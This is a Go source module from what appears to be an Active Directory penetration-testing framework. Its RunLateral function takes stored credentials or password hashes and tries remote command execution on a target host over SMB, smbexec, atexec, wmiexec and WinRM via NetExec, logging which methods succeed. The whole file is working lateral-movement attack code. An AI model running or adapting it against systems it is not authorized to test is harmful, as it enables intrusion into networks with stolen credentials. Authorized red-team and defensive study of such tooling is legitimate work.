package modules

import (
	"context"
	"fmt"
	"strings"
	"time"

	"adpack/core"
	"adpack/tools"
	"adpack/utils"
)

type protocolCheck struct {
	Name     string
	Protocol string
	Port     int
	Subcmd   string
	Extra    []string
}

func RunLateral(state *core.ADState, targetHost string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	host, found := selectTarget(state, targetHost)
	if !found {
		fmt.Println("[!] No target available for lateral movement")
		result.Success = false
		return result
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No valid credentials for lateral movement")
		result.Success = false
		return result
	}

	protocols := []protocolCheck{
		{"SMB", "smb", 445, "-x", []string{"whoami"}},
		{"PSExec", "smb", 445, "--exec-method", []string{"smbexec", "-x", "whoami"}},
		{"Schtasks", "smb", 445, "--exec-method", []string{"atexec", "-x", "whoami"}},
		{"WMI", "smb", 445, "--exec-method", []string{"wmiexec", "-x", "whoami"}},
		{"WinRM", "winrm", 5985, "-x", []string{"whoami"}},
	}

	ctx := context.Background()
	anySuccess := false

	for _, p := range protocols {
		fmt.Printf("[*] Trying %s on %s...\n", p.Name, host.IP)
		target := tools.NetExecTarget{
			Protocol: p.Protocol, Host: host.IP, Port: p.Port,
			Domain: domain, Username: user, Password: pass, Hash: hash,
		}
		r, err := tools.NetExec.Run(ctx, target, p.Subcmd, p.Extra)
		if err == nil && r.Success {
			anySuccess = true
			output := strings.TrimSpace(r.Stdout)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: "lateral_success", Phase: core.PhaseLateral,
				Source: "netexec_" + p.Protocol, Key: host.IP,
				Value:     fmt.Sprintf("%s: %s", p.Name, output),
				Timestamp: time.Now(),
			})
			fmt.Printf("  %s  %s succeeded\n", utils.SuccessStyle.Render("✓"), p.Name)
		}
	}

	if !anySuccess {
		fmt.Printf("  %s  All protocols failed\n", utils.ErrorStyle.Render("✗"))
		result.Success = false
	}

	return result
}
